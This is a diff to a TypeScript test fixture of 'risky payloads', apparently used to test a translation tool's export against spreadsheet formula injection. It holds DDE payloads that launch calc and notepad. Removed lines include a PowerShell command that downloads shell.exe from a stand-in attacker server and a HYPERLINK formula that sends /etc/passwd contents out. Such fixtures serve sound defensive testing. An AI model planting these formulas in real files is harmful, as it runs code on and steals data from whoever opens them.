@@ -29,28 +29,16 @@ export const simpleFormatFixture: IntermediateTranslationFormat = {
 export const riskyPayloads: IntermediateTranslationFormat = {
   translations: [
     {
-      term: 'DDE ("cmd";"/C calc";"!A0")A0',
-      translation: 'first',
+      term: `=cmd|' /C calc'!A0`,
+      translation: 'to open the calculator application on the target machine (calculator automatic open command)',
     },
     {
-      term: `@SUM(1+9)*cmd|' /C calc'!A0`,
-      translation: `second`,
-    },
-    {
-      term: `=10+20+cmd|' /C calc'!A0`,
-      translation: `third`,
+      term: `=HYPERLINK('https://www.google.com', 'Google')`,
+      translation: 'hyperlink function in excel',
     },
     {
       term: `=cmd|' /C notepad'!'A1'`,
-      translation: `fourth`,
-    },
-    {
-      term: `=cmd|'/C powershell IEX(wget attacker_server/shell.exe)'!A0`,
-      translation: `fifth`,
-    },
-    {
-      term: `=HYPERLINK(CONCATENATE("http://0.0.0.0:80/123.txt?v="; ('file:///etc/passwd'#$passwd.A1));"test-poc")`,
-      translation: `sixth`,
+      translation: 'to open the notepad application on excel/csv on the target machine (notepad automatic open command)',
     },
   ],
 };
